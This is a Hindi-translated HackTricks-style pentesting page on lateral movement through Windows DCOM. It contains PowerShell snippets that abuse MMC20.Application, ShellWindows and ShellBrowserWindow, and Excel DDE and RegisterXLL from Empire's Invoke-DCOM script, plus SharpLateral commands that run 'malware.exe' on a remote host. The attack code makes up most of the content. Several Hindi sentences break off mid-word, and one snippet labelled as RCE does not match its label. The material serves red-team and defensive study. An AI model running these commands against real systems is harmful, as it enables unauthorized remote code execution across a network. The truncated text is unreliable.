# DCOM Exec

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित देखना चाहते हैं**? या क्या आप **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या **मुझे** ट्विटर पर **फॉलो** करें 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को**।

</details>

**Try Hard Security Group**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/in/windows-hardening/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## MMC20.Application

**इस तकनीक के बारे में अधिक जानकारी के लिए मूल पोस्ट देखें** [**https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/**](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)

वितरित कॉम्पोनेंट ऑब्ज

```bash
Get-CimInstance Win32_DCOMApplication
```

The COM object, [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx), enables scripting of MMC snap-in operations. Notably, this object contains a `ExecuteShellCommand` method under `Document.ActiveView`. More information about this method can be found [here](https://msdn.microsoft.com/en-us/library/aa815396\(v=vs.85\).aspx). Check it running:

This feature facilitates the execution of commands over a network through a DCOM application. To interact with DCOM remotely as an admin, PowerShell can be utilized as follows:

```powershell
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

यह कमांड DCOM एप्लिकेशन से कनेक्ट करता है और COM ऑब्ज

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

प्राप्त करें RCE:

```powershell
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com | Get-Member

# Then just run something like:

ls \\10.10.10.10\c$\Users
```

## ShellWindows & ShellBrowserWindow

**इस तकनीक के बारे में अधिक जानकारी के लिए मूल पोस्ट देखें** [**https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/**](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**MMC20.Application** ऑब्ज

```powershell
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### Excel DCOM ऑब्जेक्ट के साथ लैटरल मूवमेंट

लैटरल मूवमेंट को DCOM Excel ऑब्जेक्ट का शोषण करके प्राप्त किया जा सकता है। विस्तृत जानकारी के लिए, सुझाव दिया जाता है कि [Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) पर Excel DDE का उपयोग करके DCOM के माध्यम से लैटरल मूवमेंट के बारे में चर्चा पढ़ें।

Empire परियोजना एक PowerShell स्क्रिप्ट प्रदान करती है, जो DCOM ऑब्जेक्ट को बदलकर Excel का उपयोग द्वारा दूरस्थ कोड क्रियान्वयन (RCE) का प्रदर्शन करता है। नीचे स्क्रिप्ट से अलग-अलग विधियों का प्रदर्शन करने वाले टुकड़े हैं, जो Excel का दुरुपयोग करने के लिए RCE के लिए Empire के [GitHub भंडार](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) पर उपलब्ध हैं:

```powershell
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```

### लेटरल मूवमेंट के लिए स्वचालन उपकरण

इन तकनीकों को स्वचालित करने के लिए दो उपकरणों को उजागर किया गया है:

* **Invoke-DCOM.ps1**: एक PowerShell स्क्रिप्ट जो विभिन्न विधियों को आसानी से अभिवादन करने के लिए उपयुक्त है जिससे दूरस्थ मशीनों पर कोड का निष्पादन किया जा सकता है। यह स्क्रिप्ट Empire GitHub भंडार में उपलब्ध है।
* **SharpLateral**: एक उपकरण जो दूरस्थ मशीनों पर कोड का निष्पादन करने के लिए डिज़ाइन किया गया है, जिसे निम्नलिखित कमांड के साथ उपयोग किया जा सकता है:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

## स्वचालित उपकरण

* Powershell स्क्रिप्ट [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module\_source/lateral\_movement/Invoke-DCOM.ps1) का उपयोग आसानी से अन्य मशीनों में कोड निष्पादित करने के सभी टिप्पणीकृत तरीकों को आमंत्रित करने की अनुमति देता है।
* आप [**SharpLateral**](https://github.com/mertdas/SharpLateral) का भी उपयोग कर सकते हैं:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

## संदर्भ

* [https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

**Try Hard Security Group**

<figure><img src="https://github.com/carlospolop/hacktricks/blob/in/windows-hardening/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

<details>

<summary><strong>शून्य से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a> <strong>के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी कंपनी का विज्ञापन HackTricks में देखना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं तो [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) देखें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) कलेक्शन [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **जुड़ें** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में या हमें **ट्विटर** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live) पर **फॉलो** करें।
* **HackTricks** और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में PRs सबमिट करके अपने हैकिंग ट्रिक्स साझा करें।

</details>
